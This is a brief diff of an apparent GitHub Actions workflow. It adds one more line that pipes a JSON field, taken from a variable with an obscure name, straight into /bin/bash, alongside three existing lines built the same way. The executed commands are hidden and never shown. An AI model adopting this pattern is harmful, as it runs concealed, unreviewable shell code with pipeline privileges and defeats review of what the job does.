@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$pys78" | jq -r .pyfu9 | /bin/bash
           printf '%s' "$j5154" | jq -r .wji35619 | /bin/bash
           printf '%s' "$atb6152" | jq -r .igjkc863 | /bin/bash
+          echo $jh52 | jq -r .b25513 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
